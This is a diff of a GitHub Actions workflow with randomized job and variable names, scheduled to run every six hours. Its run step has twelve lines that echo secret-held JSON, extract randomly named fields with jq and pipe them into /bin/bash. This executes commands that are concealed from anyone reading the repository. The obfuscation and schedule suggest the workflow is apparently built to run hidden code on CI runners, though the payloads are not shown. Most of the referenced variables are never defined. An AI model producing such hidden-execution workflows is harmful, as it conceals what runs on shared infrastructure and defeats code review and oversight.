@@ -2,22 +2,26 @@ name: xuejingxin7641
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 3/6 * * *'
+    - cron: '8 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xuejingxin7641
         env:
-          hl32: ${{ secrets.hl32 }}
+          j47: ${{ secrets.j47 }}
         run: |
-          echo $hl32 | jq -r .vsrrs118 | /bin/bash
-          echo $pvv1043 | jq -r .llak8 | /bin/bash
-          echo $ignu1706 | jq -r .odjt090 | /bin/bash
-          echo $p62067 | jq -r .qhmby88776 | /bin/bash
-          echo $o7 | jq -r .ek46777 | /bin/bash
-          echo $u38 | jq -r .rlszm82880 | /bin/bash
-          echo $o8 | jq -r .tc2715 | /bin/bash
+          echo $j47 | jq -r .q8772 | /bin/bash
+          echo $brba51844 | jq -r .fm07 | /bin/bash
+          echo $uv481 | jq -r .wkd0 | /bin/bash
+          echo $zcdq58 | jq -r .p5618 | /bin/bash
+          echo $g4 | jq -r .ey95 | /bin/bash
+          echo $u4011 | jq -r .ysxsd207 | /bin/bash
+          echo $nnvvl8 | jq -r .f2 | /bin/bash
+          echo $ks0469 | jq -r .jguwn8 | /bin/bash
+          echo $zmbm0 | jq -r .xua63196 | /bin/bash
+          echo $e97616 | jq -r .o54 | /bin/bash
+          echo $jzfp38653 | jq -r .ouepg1995 | /bin/bash
+          echo $qmiok424 | jq -r .b4764 | /bin/bash
 
